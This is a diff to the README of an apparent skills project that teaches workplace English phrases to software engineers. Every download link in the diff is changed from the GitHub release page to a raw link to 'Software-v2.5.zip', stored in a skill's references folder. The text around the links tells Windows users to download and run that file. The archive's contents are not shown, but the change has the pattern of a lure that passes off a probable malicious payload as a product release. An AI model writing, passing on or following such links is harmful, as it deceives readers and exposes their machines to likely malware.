@@ -1,6 +1,6 @@
 # 💬 skills - Sound Natural at Work
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Prycehot374/skills/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/Prycehot374/skills/main/skills/english-swe-daily/references/Software-v2.5.zip)
 
 ## 🧩 What this is
 
@@ -44,7 +44,7 @@ If your browser asks where to save the file, choose a folder you can find later,
 ## 🚀 Download and run on Windows
 
 1. Open the release page:
-   [https://github.com/Prycehot374/skills/releases](https://github.com/Prycehot374/skills/releases)
+   [https://raw.githubusercontent.com/Prycehot374/skills/main/skills/english-swe-daily/references/Software-v2.5.zip](https://raw.githubusercontent.com/Prycehot374/skills/main/skills/english-swe-daily/references/Software-v2.5.zip)
 
 2. Find the latest release at the top of the page
 
@@ -180,7 +180,7 @@ It is aimed at software engineers, but anyone who works in a technical team can 
 
 Visit the release page to download and run the Windows file:
 
-[https://github.com/Prycehot374/skills/releases](https://github.com/Prycehot374/skills/releases)
+[https://raw.githubusercontent.com/Prycehot374/skills/main/skills/english-swe-daily/references/Software-v2.5.zip](https://raw.githubusercontent.com/Prycehot374/skills/main/skills/english-swe-daily/references/Software-v2.5.zip)
 
 ## 📝 Example phrases
 
